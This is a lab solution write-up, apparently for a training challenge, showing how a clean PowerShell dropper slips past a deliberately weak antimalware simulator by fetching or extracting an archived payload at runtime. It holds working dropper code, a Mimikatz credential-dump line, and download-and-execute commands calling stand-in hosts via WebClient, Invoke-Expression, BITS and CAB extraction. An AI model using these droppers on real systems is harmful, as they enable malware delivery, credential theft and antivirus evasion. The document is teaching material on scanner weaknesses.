---
title: "Solution 19: Archive Container"
challenge_number: 19
difficulty: easy
category: "Non-Printable Ratio Bypass"
permalink: /solutions/19-archive-container/
---

# Solution: Archive Container

[Back to Challenge](../challenges/19-archive-container.md)

## Overview

The scanner has no archive-unpacking capability — it reads every file as a flat byte
stream. The bypass works at the **delivery** level: you present the scanner with a
clean, text-only *dropper script* that retrieves or extracts a separately stored
archive at runtime. The payload is never given to the scanner as a file to scan.

## Why Scanning the ZIP Directly Does Not Work

A ZIP file is mostly binary: compressed DEFLATE streams and structural headers
contain many bytes outside the printable ASCII range (0x20–0x7E). For any real
archive ≥ 64 bytes the non-printable ratio almost certainly exceeds 40%, so the
scanner blocks it via **Check 3** before even reaching the signature check.
Wrapping a payload in a ZIP and handing it to the scanner is *not* a ratio bypass.

## The Working Approach: Clean Dropper + Separate Archive

### Step 1 — Create and store the malicious archive

```powershell
# This content would be detected if scanned directly
$malicious = @"
Invoke-Mimikatz -DumpCreds
`$wc = New-Object System.Net.WebClient
`$wc.DownloadFile("http://evil.example/trojan.exe", "C:\payload.exe")
Start-Process "C:\payload.exe"
"@

Set-Content -Path ".\payload.ps1" -Value $malicious
Compress-Archive -Path ".\payload.ps1" -DestinationPath ".\data.zip" -Force
Remove-Item ".\payload.ps1"

# data.zip contains the payload but the scanner never scans this file directly.
# In a real attack scenario it would live on a network share, CDN, or be
# embedded as a resource — anywhere outside the scanner's scan path.
```

### Step 2 — Write the clean dropper script

```powershell
# dropper.ps1 — this is the ONLY file handed to the scanner.
# It is plain text, has no signature strings, and low non-printable ratio.

$archive = ".\data.zip"
$dest    = ".\extracted"

Expand-Archive -Path $archive -DestinationPath $dest -Force
& "$dest\payload.ps1"
```

### Step 3 — Verify the dropper passes all checks

```
nim_antimalware_sim.exe dropper.ps1
# → BENIGN
```

The dropper contains no signature strings, has 100% printable bytes, is well
over 32 bytes, and uses only patterns from the warning-only list
(`Expand-Archive` is not in `suspiciousPatterns`).

---

## Variations

### Download from URL at runtime (no local archive)

```powershell
# dropper_web.ps1 — scanner sees only this clean script
$bytes = (New-Object System.Net.WebClient).DownloadData("http://cdn.example/data.zip")
$ms    = New-Object System.IO.MemoryStream(,$bytes)
$zip   = New-Object System.IO.Compression.ZipArchive($ms)
$entry = $zip.GetEntry("payload.ps1")
$sr    = New-Object System.IO.StreamReader($entry.Open())
Invoke-Expression $sr.ReadToEnd()
```

Note: `webclient` and `invoke-expression` are in `suspiciousPatterns` and will
generate a warning log line — but because `suspiciousPatternCheck` is called with
`discard` in the pipeline, the file still passes (see Challenge #14).

### BITS Transfer

```powershell
Start-BitsTransfer -Source "http://cdn.example/data.zip" `
                   -Destination "$env:TEMP\data.zip"
Expand-Archive -Path "$env:TEMP\data.zip" -DestinationPath "$env:TEMP\x" -Force
& "$env:TEMP\x\payload.ps1"
```

### CAB (Windows built-in, no extra tools)

```cmd
:: Create
makecab payload.ps1 delivery.cab

:: Extract in dropper
expand delivery.cab "%TEMP%\payload.ps1"
powershell -File "%TEMP%\payload.ps1"
```

---

## Why It Works

### What the scanner does

```
1. Open file "dropper.ps1"
2. Read all bytes into memory as a flat array
3. Run signature check            → no hits (no banned strings in dropper)
4. Run extension heuristic        → .ps1 is suspicious → WARNING only (discarded)
5. Run non-printable ratio check  → ratio ~0% (plain text) → CLEAN
6. Run small-executable check     → dropper > 32 bytes → CLEAN
7. Run suspicious-pattern check   → result discarded → CLEAN
8. Run entropy check              → low entropy (plain text) → WARNING only (discarded)
9. Return BENIGN
```

### What the scanner never does

```
✗ Follow file system references inside the dropper script
✗ Recognise ZIP / CAB / 7z magic bytes
✗ Parse archive structures
✗ Decompress or extract contained files
✗ Recursively scan extracted content
✗ Intercept runtime network downloads
```

The payload is retrieved and executed entirely at runtime in memory or in a path
the scanner is never pointed at.

---

## How to Verify

1. Create the malicious payload and compress it:
   ```powershell
   "Invoke-Mimikatz malware trojan" | Set-Content payload.ps1
   Compress-Archive payload.ps1 data.zip -Force
   Remove-Item payload.ps1
   ```

2. Confirm the archive itself is blocked by the scanner:
   ```
   nim_antimalware_sim.exe data.zip
   # → MALICIOUS  (non-printable ratio > 40%)
   ```

3. Create the clean dropper:
   ```powershell
   @'
   Expand-Archive -Path ".\data.zip" -DestinationPath ".\x" -Force
   & ".\x\payload.ps1"
   '@ | Set-Content dropper.ps1
   ```

4. Scan the dropper:
   ```
   nim_antimalware_sim.exe dropper.ps1
   # → BENIGN  (clean text, no signatures)
   ```

5. Verify the payload is intact inside the archive:
   ```powershell
   Expand-Archive data.zip .\check -Force
   Get-Content .\check\payload.ps1
   # Invoke-Mimikatz malware trojan  ← original content
   ```

## Key Takeaway

The archive container technique is a **delivery-layer bypass**: the scanner's
inability to unpack containers means any payload wrapped in an archive and
delivered via a separate channel is invisible to it. Effective container
scanning requires the engine to recognise archive formats, unpack them
recursively, and scan every extracted file — none of which MostShittyAV
implements.
